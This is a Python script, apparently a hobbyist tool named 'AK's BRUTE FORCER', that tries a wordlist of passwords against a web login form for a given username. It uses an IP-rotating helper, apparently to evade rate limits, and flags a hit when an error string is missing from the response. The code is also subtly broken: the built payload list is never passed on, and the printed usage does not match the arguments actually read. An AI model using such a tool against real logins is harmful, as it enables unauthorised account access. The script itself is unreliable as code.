import iprotate
from termcolor import colored
import sys

def filesy(lists):
    with open(lists,"r") as wrdlist:
        for word in wrdlist:
            yield word.rstrip() 
        
def response_handler(res,err,data):
    if err not in res.content:
        print(colored(f"The correct password is ....{data['password']}",'green'))
    else:
        print(f"The wrong password is ....{data['password']}")        
        
def main():
    a= []
    b=[]
    words=filesy(sys.argv[2])
    url=sys.argv[1]
    thread=int(sys.argv[4])
    sleep_time=int(sys.argv[5])
    handler = response_handler
    method='POST'
    err=sys.argv[6]
    a.append(url)
    a.append(err)
    data={'username':sys.argv[3],'Login':'Login'}
    for word in words:
         data['password']=word
         a.append(data)
         a.append(a)
         a.pop(len(a)-1)
         
    iprotate.IProtator(b,method,thread,handler,sleep_time)        
    
        

if __name__=="__main__":
    print(colored("WELCOME to AK's BRUTE FORCER".center(80,'-'),'blue'))
    print(colored(f'usage {sys.argv[0]} <url> <path to pass list> <thead limit> <sleep time> <error string>','red'))
    if len(sys.argv)==7:
        main()
    else:
        print(colored("------- the syntax is wrong -------",'red'))
       